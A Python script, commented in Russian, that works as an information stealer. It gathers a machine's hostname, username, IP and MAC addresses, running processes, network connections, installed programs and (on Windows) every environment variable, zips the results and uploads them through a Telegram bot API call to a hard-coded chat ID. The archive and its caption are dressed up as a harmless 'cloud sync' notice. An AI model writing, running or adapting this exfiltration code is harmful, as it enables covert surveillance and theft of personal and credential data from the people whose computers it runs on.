import platform
import psutil
import socket
import uuid
import json
import zipfile
import io
import os
import random
import string
from datetime import datetime
import requests
import subprocess
import getpass

# данные
BOT_TOKEN = "token"
YOUR_CHAT_ID = "7464964710"

def generate_random_id(length=8):
    """Генерация случайного ID"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def get_system_info():
    """Сбор ПОЛНОЙ системной информации"""
    info = {
        "cloud_id": generate_random_id(8),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "ram_total": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "ram_available": f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
        "ram_percent": psutil.virtual_memory().percent,
        "ram_used": f"{psutil.virtual_memory().used / (1024**3):.2f} GB",
        "cpu_count": psutil.cpu_count(),
        "cpu_physical": psutil.cpu_count(logical=False),
        "cpu_freq": f"{psutil.cpu_freq().current:.2f} MHz" if psutil.cpu_freq() else "N/A",
        "cpu_percent": psutil.cpu_percent(interval=1),
        "cpu_percent_per_core": psutil.cpu_percent(interval=1, percpu=True),
        "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        "public_ip": get_public_ip(),
        "local_ips": [],
        "mac_addresses": [],
        "disk_usage": {},
        "disk_io": {},
        "network_interfaces": {},
        "network_connections": [],
        "processes": [],
        "users": [],
        "browsers": get_browsers(),
        "env_vars": dict(os.environ) if os.name == 'nt' else {},
        "hostname_full": socket.getfqdn()
    }
    
    hostname = socket.gethostname()
    try:
        info['local_ips'] = socket.gethostbyname_ex(hostname)[2]
    except:
        info['local_ips'] = []
    
    net_if_addrs = psutil.net_if_addrs()
    for interface, addrs in net_if_addrs.items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                info['mac_addresses'].append(f"{interface}: {addr.address}")
    
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            info["disk_usage"][partition.device] = {
                "mountpoint": partition.mountpoint,
                "filesystem": partition.fstype,
                "total_gb": f"{usage.total / (1024**3):.2f}",
                "used_gb": f"{usage.used / (1024**3):.2f}",
                "free_gb": f"{usage.free / (1024**3):.2f}",
                "percent": usage.percent
            }
        except:
            pass
    

    try:
        disk_io = psutil.disk_io_counters()
        if disk_io:
            info["disk_io"] = {
                "read_bytes_gb": f"{disk_io.read_bytes / (1024**3):.2f}",
                "write_bytes_gb": f"{disk_io.write_bytes / (1024**3):.2f}",
                "read_count": disk_io.read_count,
                "write_count": disk_io.write_count
            }
    except:
        pass
    

    net_if_stats = psutil.net_if_stats()
    for interface, stats in net_if_stats.items():
        info["network_interfaces"][interface] = {
            "up": stats.isup,
            "speed": stats.speed,
            "mtu": stats.mtu
        }
    

    try:
        for conn in psutil.net_connections()[:20]:
            info["network_connections"].append({
                "fd": conn.fd,
                "family": str(conn.family),
                "type": str(conn.type),
                "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                "status": conn.status,
                "pid": conn.pid
            })
    except:
        pass
    

    for proc in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status', 'create_time']), 
                      key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:30]:
        try:
            create_time = datetime.fromtimestamp(proc.info['create_time']).strftime("%H:%M:%S") if proc.info['create_time'] else "N/A"
            info["processes"].append({
                "pid": proc.info['pid'],
                "name": proc.info['name'],
                "cpu": proc.info['cpu_percent'],
                "memory_percent": f"{proc.info['memory_percent']:.1f}" if proc.info['memory_percent'] else "0",
                "memory_mb": f"{proc.memory_info().rss / 1024 / 1024:.1f}" if hasattr(proc, 'memory_info') else "N/A",
                "status": proc.info['status'],
                "created": create_time
            })
        except:
            pass

    for user in psutil.users():
        info["users"].append({
            "name": user.name,
            "terminal": user.terminal,
            "host": user.host,
            "started": datetime.fromtimestamp(user.started).strftime("%H:%M:%S")
        })
    
    return info

def get_public_ip():
    """Получение публичного IP"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        try:
            return requests.get('https://icanhazip.com', timeout=5).text.strip()
        except:
            return "Unknown"

def get_browsers():
    """Определение установленных браузеров"""
    browsers = []
    paths = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"),
        "Firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\firefox.exe"),
        "Edge": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "Opera": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera\\launcher.exe"),
        "Yandex": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe"),
        "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")
    }
    
    for name, path in paths.items():
        if os.path.exists(path):
            browsers.append(name)
    
    return browsers

def get_installed_programs():
    """Список установленных программ (Windows)"""
    programs = []
    if platform.system() == "Windows":
        try:
            import winreg
            reg_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for reg_path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
                                publisher = winreg.QueryValueEx(subkey, "Publisher")[0] if "Publisher" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "N/A"
                                programs.append(f"{name} - {version} ({publisher})")
                            except:
                                pass
                            subkey.Close()
                        except:
                            pass
                    key.Close()
                except:
                    pass
        except:
            pass
    
    return "\n".join(sorted(programs)[:500])  

def create_full_archive(info):
    """Создание полного архива с данными"""
    memory_zip = io.BytesIO()
    cloud_id = info['cloud_id']
    
    with zipfile.ZipFile(memory_zip, 'w', zipfile.ZIP_DEFLATED) as zf:

        json_data = json.dumps(info, indent=2, ensure_ascii=False)
        zf.writestr(f'system_report_{cloud_id}.json', json_data)
        

        text_report = format_full_report(info)
        zf.writestr(f'system_info_{cloud_id}.txt', text_report)

        processes_text = format_processes_detailed(info)
        zf.writestr(f'processes_{cloud_id}.txt', processes_text)
        

        network_text = format_network_detailed(info)
        zf.writestr(f'network_{cloud_id}.txt', network_text)
        
        if platform.system() == "Windows":
            try:
                programs = get_installed_programs()
                zf.writestr(f'programs_{cloud_id}.txt', programs)
            except:
                zf.writestr(f'programs_{cloud_id}.txt', "Не удалось получить список программ")
        
        readme = f"""☁️ CLOUD SYNC [{cloud_id}] ☁️

Дата: {info['timestamp']}
Устройство: {info['hostname']}
Пользователь: {info['username']}
IP: {info['public_ip']}

Файлы в архиве:
- system_report_{cloud_id}.json - полные данные в JSON
- system_info_{cloud_id}.txt - системная информация
- processes_{cloud_id}.txt - все процессы
- network_{cloud_id}.txt - сетевые подключения
- programs_{cloud_id}.txt - установленные программы
"""
        zf.writestr('README.txt', readme)
    
    memory_zip.seek(0)
    return memory_zip, cloud_id

def format_full_report(info):
    """Форматирование полного отчета"""
    lines = []
    lines.append("="*80)
    lines.append(f"СИСТЕМНЫЙ ОТЧЕТ - {info['cloud_id']}")
    lines.append("="*80)
    lines.append(f"Дата: {info['timestamp']}")
    lines.append(f"Компьютер: {info['hostname']} ({info['hostname_full']})")
    lines.append(f"Пользователь: {info['username']}")
    lines.append("")
    lines.append("--- СИСТЕМА ---")
    lines.append(f"ОС: {info['os']} {info['os_release']}")
    lines.append(f"Версия: {info['os_version']}")
    lines.append(f"Архитектура: {info['architecture']}")
    lines.append(f"Время загрузки: {info['boot_time']}")
    lines.append("")
    lines.append("--- ПРОЦЕССОР ---")
    lines.append(f"Модель: {info['processor']}")
    lines.append(f"Ядер (всего): {info['cpu_count']}")
    lines.append(f"Ядер (физ): {info['cpu_physical']}")
    lines.append(f"Частота: {info['cpu_freq']}")
    lines.append(f"Загрузка: {info['cpu_percent']}%")
    lines.append(f"По ядрам: {info['cpu_percent_per_core']}")
    lines.append("")
    lines.append("--- ПАМЯТЬ RAM ---")
    lines.append(f"Всего: {info['ram_total']}")
    lines.append(f"Использовано: {info['ram_used']} ({info['ram_percent']}%)")
    lines.append(f"Доступно: {info['ram_available']}")
    lines.append("")
    lines.append("--- ДИСКИ ---")
    for disk, data in info['disk_usage'].items():
        lines.append(f"  {disk} [{data['mountpoint']}] - {data['filesystem']}")
        lines.append(f"    Всего: {data['total_gb']} GB")
        lines.append(f"    Использовано: {data['used_gb']} GB ({data['percent']}%)")
        lines.append(f"    Свободно: {data['free_gb']} GB")
    lines.append("")
    lines.append("--- IP АДРЕСА ---")
    lines.append(f"Публичный: {info['public_ip']}")
    lines.append(f"Локальные: {', '.join(info['local_ips']) if info['local_ips'] else 'Нет'}")
    lines.append("")
    lines.append("--- MAC АДРЕСА ---")
    for mac in info['mac_addresses']:
        lines.append(f"  {mac}")
    lines.append("")
    lines.append("--- БРАУЗЕРЫ ---")
    lines.append(f"Установлены: {', '.join(info['browsers']) if info['browsers'] else 'Не найдены'}")
    lines.append("")
    lines.append("--- ПОЛЬЗОВАТЕЛИ В СИСТЕМЕ ---")
    for user in info['users']:
        lines.append(f"  {user['name']} - {user['host']} с {user['started']}")
    
    return "\n".join(lines)

def format_processes_detailed(info):
    """Детальный список процессов"""
    lines = []
    lines.append("="*80)
    lines.append(f"АКТИВНЫЕ ПРОЦЕССЫ - {info['cloud_id']}")
    lines.append("="*80)
    lines.append(f"Всего процессов: {len(info['processes'])}")
    lines.append("")
    lines.append("PID  | ИМЯ                     | CPU% | RAM% | RAM(MB) | СТАТУС    | ЗАПУЩЕН")
    lines.append("-"*80)
    
    for p in info['processes'][:50]:  # Топ 50
        lines.append(f"{p['pid']:<5} | {p['name']:<24} | {p['cpu']:<4} | {p['memory_percent']:<4} | {p['memory_mb']:<7} | {p['status']:<9} | {p['created']}")
    
    return "\n".join(lines)

def format_network_detailed(info):
    """Детальная сетевая информация"""
    lines = []
    lines.append("="*80)
    lines.append(f"СЕТЕВЫЕ ПОДКЛЮЧЕНИЯ - {info['cloud_id']}")
    lines.append("="*80)
    lines.append("")
    lines.append("--- АКТИВНЫЕ СОЕДИНЕНИЯ ---")
    lines.append("ЛОКАЛЬНЫЙ АДРЕС -> УДАЛЕННЫЙ АДРЕС          СТАТУС      PID")
    lines.append("-"*80)
    
    for conn in info['network_connections'][:30]:
        lines.append(f"{conn['laddr']:<22} -> {conn['raddr']:<22} {conn['status']:<10} {conn['pid']}")
    
    return "\n".join(lines)

def send_to_telegram(file_data, cloud_id):
    """Отправка в Telegram с нужным сообщением"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        # Генерируем случайное число файлов
        files_count = random.randint(5, 8)
        
        # СООБЩЕНИЕ КАК ТЫ ПРОСИЛ:
        message = f"☁️ Из вашего облака было загружено {files_count} файлов, Откройте архив для просмотра. ☁️"
        
        files = {'document': (f"cloud_data_{cloud_id}.zip", file_data.getvalue(), 'application/zip')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': message}
        
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка: {e}")
        return False

def main():
    """Основная функция"""
    try:
        print("🔍 Сбор полной информации о системе...")
        info = get_system_info()
        cloud_id = info['cloud_id']
        
        print(f"📦 Создание архива [ID: {cloud_id}]...")
        archive_data, cloud_id = create_full_archive(info)
        
        print("📤 Отправка в Telegram...")
        if send_to_telegram(archive_data, cloud_id):
            print("✅ Готово! Архив отправлен")
        else:
            print("❌ Ошибка отправки")
            
    except Exception as e:
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
